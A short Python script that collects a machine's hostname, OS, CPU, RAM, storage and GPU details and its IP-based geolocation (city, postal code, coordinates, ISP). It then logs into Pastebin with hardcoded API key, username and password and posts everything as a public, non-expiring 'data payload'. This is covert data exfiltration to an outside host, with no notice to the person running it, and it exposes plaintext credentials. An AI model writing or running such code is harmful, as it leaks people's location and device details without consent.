import datetime
import socket
import platform
import psutil
import GPUtil
import requests
from cpuinfo import get_cpu_info



info = {}
info["timestamp"] = str(datetime.datetime.now())

info["hostname"] = socket.gethostname()
info["OS"] = platform.platform()

info["CPU"] =  []
info["CPU"].append(get_cpu_info()['brand_raw'])
info["CPU"].append(platform.processor())





info["CPU Core Count"] = psutil.cpu_count(logical=False)

info["RAM (GB)"] = round(psutil.virtual_memory().total / 1e9, 2)
info["Storage (GB)"] = round(psutil.disk_usage('/').total / 1e9, 2)


gpus = GPUtil.getGPUs()
if gpus:
    info["GPU"] = []
    for index, gpu in enumerate(gpus):
        info["GPU"].append(gpus[index].name)

print(info)



location = {}

try:
    response = requests.get("https://ipinfo.io")
    data = response.json()

    # location["IP"] = data.get("ip")
    location["City"] = data.get("city")
    location["Region"] = data.get("region")
    location["Country"] = data.get("country")
    location["Location"] = data.get("loc")
    location["Timezone"] = data.get("timezone")
    location["Org"] = data.get("org")
    location["Postal"] = data.get("postal")

except:
    location["Error"] = "Location // unable to retrieve"

print(location)




# _________________________________ beginning of pastebin info submission



import requests

devkey = '28APByxoun_kv2DQzodnz5KM2eqanAF-'
username = 'whatthehelly'
password = 'theredbanana'

login_info = {
    "api_dev_key": devkey,
    "api_user_name": username,
    "api_user_password": password,
    "api_option": "login"
}

loggingin = requests.post("https://pastebin.com/api/api_login.php", data=login_info)

if loggingin.status_code != 200:
    print("Login failed, program cannot login to pastebin")
    exit()

api_user_key = loggingin.text

log_data = f"Welcome to another data payload. This log was collected on {info['timestamp']}, in the fine city of {location['City']}, {location['Country']}, {location['Postal']} in {location['Country']} (Coordinates: {location['Location']}). \nThe network provider is {location['Org']}, and the local timezone is {location['Timezone']}. \nThe data was collected from a formidable machine, named {info['hostname']}, running the {info['OS']} Operating System. \nIt is powered by the: {info['CPU'][0]}, {info['CPU'][1]}, with {info['CPU Core Count']} Cores. \nThe machine runs on {info['RAM (GB)']} Gigabytes of RAM, and has {info['Storage (GB)']} Gigabytes of SSD/HDD storage. \nThey may or may not have a GPU: {info['GPU'][0]}. :o"

paste_info= {
    'api_dev_key': devkey,
    'api_user_key': api_user_key,  # this allows me to paste to my account. 
    'api_option': 'paste',
    'api_paste_code': log_data,
    'api_paste_private': '0',  # 0 = public, 1 = unlisted, 2 = private
    'api_paste_name': "Inspector's Info Log (manual)",
    'api_paste_expire_date': 'N'
}

response= requests.post("https://pastebin.com/api/api_post.php", data=paste_info)

print("paste url: ", response.text)